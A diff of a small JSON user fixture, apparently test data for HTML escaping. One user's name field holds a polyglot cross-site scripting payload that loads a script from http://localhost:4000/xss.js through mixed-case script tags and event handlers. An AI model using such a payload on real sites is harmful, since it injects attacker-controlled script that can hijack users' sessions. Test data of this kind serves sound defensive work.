@@ -1,12 +1,12 @@
 {
   "users": [
     {
-      "name": "This is <b>an example</b>",
+      "name": "Rick <b>Astley</b>",
       "email": "pine@apple.it"
     },
     {
-      "name": "\"`StYle><ScRiPt sRc='http://localhost:4000/xss.js'></ScRiPt>'sOurCe> noScRIpt>' oNmOuSeOveR=\\\" OnBlUr= `<!--jAvAsCriPt:-noScRIpt&gt;)'sOurCe>nOeMbed&gt;/bUtTon>/tITle>/sOurCe>import(`http://localhost:4000/xss.js`),viDeO>>'a&gt;*/<ScRiPt sRc=\\\"http://localhost:4000/xss.js\\\"></ScRiPt>- OnBlUr=--> oNeRrOr='nOfRaMeS>`*/&gt;--!> oNtOgGle=  onClICk=(<ScRiPt sRc=\\\"http://localhost:4000/xss.js\\\"></ScRiPt>\"",
-      "email": "insecure@email.com"
+      "name": "`StYle><ScRiPt sRc='http://localhost:4000/xss.js'></ScRiPt>'sOurCe> noScRIpt>' oNmOuSeOveR=\\\" OnBlUr= `<!--jAvAsCriPt:-noScRIpt&gt;)'sOurCe>nOeMbed&gt;/bUtTon>/tITle>/sOurCe>import(`http://localhost:4000/xss.js`),viDeO>>'a&gt;*/<ScRiPt sRc=\\\"http://localhost:4000/xss.js\\\"></ScRiPt>- OnBlUr=--> oNeRrOr='nOfRaMeS>`*/&gt;--!> oNtOgGle=  onClICk=(<ScRiPt sRc=\\\"http://localhost:4000/xss.js\\\"></ScRiPt>",
+      "email": "insecure@data.com"
     }
   ]
 }
